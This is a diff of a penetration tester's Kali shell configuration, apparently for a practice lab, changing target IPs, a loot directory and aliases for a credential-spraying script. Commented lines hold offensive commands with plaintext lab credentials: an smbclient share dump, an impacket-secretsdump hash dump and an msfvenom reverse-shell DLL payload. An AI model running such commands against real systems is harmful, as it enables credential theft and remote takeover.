@@ -6,12 +6,12 @@
 export RHOST="192.168.186.189"
 export LHOST="192.168.45.225"
 export RHOST="192.168.197.153"
-export LHOST="192.168.45.158"
 export RPORT=""
 export LPORT=""
 export USERNAME=""
 export PASSWORD=""
 
+#smbclient -U 'relia.com\jim%Castello1!' -c 'mask "";recurse ON;prompt OFF;mget *' //192.168.232.248/transfer
 alias credspray='(){/home/kali/Tools/scripts/CredSpray.py "$@"}'
 #smbclient -U 'relia.com\jim%Castello1!' -c 'mask "";recurse ON;prompt OFF;mget *' //192.168.232.248/transfer 
 #impacket-secretsdump -just-dc-user brad relia.com/andrea:"PasswordPassword_6"@172.16.120.6
@@ -39,7 +39,7 @@ alias setpassword='(){/home/kali/setpassword.py "$1" && source /home/kali/.kali}
 alias setlport='(){/home/kali/setlport.py "$1" && source /home/kali/.kali}'
 #alias setcwd='hash -d cwd=`pwd`'
 alias setcwd='(){/home/kali/setcwd.py "$1" && source /home/kali/.kali}'
-export cwd="/home/kali/Documents/Relia"
+export cwd="/home/kali/Documents/Relia/loot"
 alias cwd='cd "$cwd"'
 alias s='(){grep -i "$1" /home/kali/.kali --color}'
 alias o='gedit /home/kali/.kali &'
@@ -229,3 +229,4 @@ alias tmuxhelp='unset TMUX;tmux list-keys'
 
 
 
+#msfvenom -p windows/x64/shell_reverse_tcp LHOST=172.16.160.14 LPORT=1236 -f dll > beyondhelper.dll
